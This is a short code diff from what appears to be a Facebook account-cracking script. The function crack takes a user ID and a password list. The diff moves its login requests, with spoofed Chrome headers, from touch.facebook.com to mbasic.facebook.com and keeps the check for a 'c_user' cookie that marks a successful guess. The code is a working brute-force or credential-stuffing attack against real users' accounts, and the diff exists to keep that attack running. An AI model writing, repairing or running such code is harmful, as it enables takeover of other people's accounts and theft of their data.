@@ -184,9 +184,9 @@ def crack(uid, password_list, total_count):
             'accept': '*/*',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,bn;q=0.6',
             'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-            'origin': 'https://touch.facebook.com',
+            'origin': 'https://mbasic.facebook.com',
             'priority': 'u=1, i',
-            'referer': 'https://touch.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fasync%2Fwbloks%2Ffetch%2F%3Fappid%3Dcom.bloks.www.bloks.caa.login.async.send_login_request%26type%3Daction%26__bkv%3D5870af81e45750eb22160e3fe74a22f1ec7a22fa20d66f6fa34875f44676e658%26wtsid%3Drdr_0EQ7sA15easbCjdcs',
+            'referer': 'https://mbasic.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fasync%2Fwbloks%2Ffetch%2F%3Fappid%3Dcom.bloks.www.bloks.caa.login.async.send_login_request%26type%3Daction%26__bkv%3D5870af81e45750eb22160e3fe74a22f1ec7a22fa20d66f6fa34875f44676e658%26wtsid%3Drdr_0EQ7sA15easbCjdcs',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
             'sec-ch-ua-full-version-list': '"Google Chrome";v="143.0.7499.41", "Chromium";v="143.0.7499.41", "Not A(Brand";v="24.0.0.0"',
@@ -345,7 +345,7 @@ def crack(uid, password_list, total_count):
         }
     })
 }
-            respon = Session.post('https://touch.facebook.com/async/wbloks/fetch/', params=params, cookies=cookies, headers=headers, data=data)
+            respon = Session.post('https://mbasic.facebook.com/async/wbloks/fetch/', params=params, cookies=cookies, headers=headers, data=data)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
